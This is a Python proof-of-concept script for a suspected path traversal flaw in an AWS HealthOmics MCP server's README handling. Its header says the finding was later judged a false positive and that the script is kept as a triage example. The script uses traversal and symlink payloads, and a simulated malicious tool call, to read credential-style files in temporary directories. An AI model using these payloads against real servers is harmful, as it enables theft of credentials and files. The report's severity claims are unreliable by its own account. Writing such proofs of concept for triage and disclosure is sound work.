# NOTE (added Nov 2026): the finding this PoC demonstrates was later judged a
# FALSE POSITIVE for practical exploitation — see verdict-summary.md.
# No bounty was submitted or paid. Kept as a worked example of triage.
#!/usr/bin/env python3
"""
Proof-of-Concept: Path Traversal in awslabs/mcp aws-healthomics-mcp-server

Vulnerability: In validate_readme_input() (validation_utils.py), the `readme`
parameter is passed directly to open(readme, 'r') without path sanitization.
The detect_readme_input_type() only checks for .md extension and file existence,
but does NOT validate against directory traversal sequences (../).

This allows an attacker to read arbitrary .md files anywhere on the filesystem
via path traversal, or read any file if a symlink with .md extension is created.

Affected: awslabs/aws-healthomics-mcp-server <= current main branch
File: src/aws-healthomics-mcp-server/awslabs/aws_healthomics_mcp_server/utils/validation_utils.py
Lines: 45-63 (detect_readme_input_type), 487-490 (unsanitized open())
"""

import os
import tempfile


def detect_readme_input_type(readme: str):
    """Vulnerable detection logic (extracted from validation_utils.py:45-63)"""
    if readme.startswith('s3://'):
        return 'S3_URI'
    # VULNERABLE: No path traversal sanitization here!
    # Only checks .md extension and file existence
    if readme.lower().endswith('.md') and os.path.isfile(readme):
        return 'LOCAL_FILE'
    return 'MARKDOWN_CONTENT'


def validate_readme_input_simulated(readme: str | None):
    """Simulated vulnerable path (validation_utils.py:452-505)"""
    if readme is None:
        return None

    input_type = detect_readme_input_type(readme)

    if input_type == 'S3_URI':
        return (None, readme)  # Would validate S3 URI

    elif input_type == 'LOCAL_FILE':
        # VULNERABLE: open() called WITHOUT path sanitization!
        # No validate_local_path() is called (unlike content_resolver.py)
        try:
            with open(readme, 'r', encoding='utf-8') as f:
                content = f.read()
            return (content, None)
        except FileNotFoundError:
            raise FileNotFoundError(f"README file not found: {readme}")
        except IOError as e:
            raise IOError(f"Failed to read README file {readme}: {e}")

    else:  # MARKDOWN_CONTENT
        return (readme, None)


def poc_path_traversal():
    """Demonstrate path traversal to read arbitrary .md file"""
    print("=" * 70)
    print("PoC 1: Path Traversal via .md file")
    print("=" * 70)

    with tempfile.TemporaryDirectory() as tmpdir:
        # Create a "secret" file outside the expected directory
        secret_dir = os.path.join(tmpdir, "secret_area")
        os.makedirs(secret_dir)
        secret_file = os.path.join(secret_dir, "secret.md")
        with open(secret_file, 'w') as f:
            f.write("SECRET_DATA: AWS_ACCESS_KEY_ID=[REDACTED]\n")

        # Simulate the MCP server running in a subdirectory
        server_dir = os.path.join(tmpdir, "server", "workspace")
        os.makedirs(server_dir)
        os.chdir(server_dir)

        # Attacker provides path traversal payload
        payload = "../../secret_area/secret.md"

        print(f"\n[+] Server cwd: {server_dir}")
        print(f"[+] Target secret: {secret_file}")
        print(f"[+] Payload: readme='{payload}'")
        print(f"[+] Detected type: {detect_readme_input_type(payload)}")

        result = validate_readme_input_simulated(payload)
        print(f"\n[+] EXFILTRATED CONTENT:\n{result[0]}")
        print("\n[*] Vulnerability confirmed: Arbitrary .md file read via path traversal")


def poc_symlink_bypass():
    """Demonstrate symlink trick to read non-.md files"""
    print("\n" + "=" * 70)
    print("PoC 2: Symlink Bypass to read non-.md files")
    print("=" * 70)

    with tempfile.TemporaryDirectory() as tmpdir:
        # Create a sensitive non-.md file
        secret_file = os.path.join(tmpdir, "credentials")
        with open(secret_file, 'w') as f:
            f.write("[default]\naws_access_key_id = [REDACTED-EXAMPLE-KEY-ID]\n")

        # Attacker creates a symlink with .md extension in server-accessible dir
        server_dir = os.path.join(tmpdir, "server")
        os.makedirs(server_dir)
        symlink_path = os.path.join(server_dir, "link.md")
        os.symlink(secret_file, symlink_path)

        os.chdir(server_dir)
        payload = "link.md"

        print(f"\n[+] Created symlink: {symlink_path} -> {secret_file}")
        print(f"[+] Payload: readme='{payload}'")
        print(f"[+] Detected type: {detect_readme_input_type(payload)}")

        result = validate_readme_input_simulated(payload)
        print(f"\n[+] EXFILTRATED CONTENT:\n{result[0]}")
        print("\n[*] Vulnerability confirmed: Arbitrary file read via symlink + .md extension")


def poc_mcp_tool_call_simulation():
    """Simulate the actual MCP tool call that would exploit this"""
    print("\n" + "=" * 70)
    print("PoC 3: Simulated MCP create_workflow() tool call")
    print("=" * 70)

    # This simulates what an attacker would send via an MCP client
    malicious_tool_call = {
        "tool": "create_workflow",
        "params": {
            "name": "exfil-workflow",
            "description": "Legitimate sounding workflow",
            "readme": "../../../etc/passwd.md",  # Traversal payload targeting .md file
            "definition_source": "...",
            # Other required params...
        }
    }

    print(f"\n[+] Malicious MCP tool call:")
    print(f"    Tool: {malicious_tool_call['tool']}")
    print(f"    readme param: {malicious_tool_call['params']['readme']}")
    print(f"\n[*] If /etc/passwd.md exists on the server, its contents would be")
    print("    read and included in the workflow creation request, potentially")
    print("    leaking sensitive data to AWS HealthOmics or the MCP client.")
    print("\n[*] Even without /etc/passwd.md, any .md file on the filesystem")
    print("    is readable via path traversal - e.g., ../../../home/user/.aws/config.md")


if __name__ == "__main__":
    print("""
╔══════════════════════════════════════════════════════════════════════╗
║  PoC: Path Traversal in awslabs/mcp aws-healthomics-mcp-server       ║
║  CVE: Pending | Severity: Medium                                     ║
╚══════════════════════════════════════════════════════════════════════╝
""")
    poc_path_traversal()
    poc_symlink_bypass()
    poc_mcp_tool_call_simulation()
    print("\n" + "=" * 70)
    print("SUMMARY")
    print("=" * 70)
    print("""
The validate_readme_input() function in validation_utils.py calls
open(readme, 'r') without sanitizing path traversal sequences. While
there is a .md extension check, this only limits the attack surface
to .md files - any .md file anywhere on the filesystem can be read.

Additionally, a symlink with .md extension pointing to any file
completely bypasses the extension restriction.

This is inconsistent with content_resolver.py which DOES call
validate_local_path() to block traversal sequences.

Permalink: https://github.com/awslabs/mcp/blob/main/src/aws-healthomics-mcp-server/awslabs/aws_healthomics_mcp_server/utils/validation_utils.py#L490
""")
